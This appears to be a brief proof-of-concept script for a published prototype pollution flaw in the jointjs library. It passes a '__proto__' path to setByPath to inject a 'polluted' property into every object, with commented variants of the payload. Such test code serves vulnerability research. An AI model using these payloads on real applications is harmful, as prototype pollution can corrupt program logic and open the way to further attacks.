//https://security.snyk.io/vuln/SNYK-JS-JOINTJS-1579578
 
   

  const jointjs = require("jointjs");
  jointjs.util.setByPath.__x_toTaint = true;
  jointjs.util.setByPath({}, [["__proto__"], "polluted"], "yes");


// jointjs.util.setByPath({}, 'proto/polluted', 'yes');
// jointjs.util.setByPath({}, ['proto', 'polluted'], 'yes');
// console.log(polluted); // ReferenceError: polluted is not defined
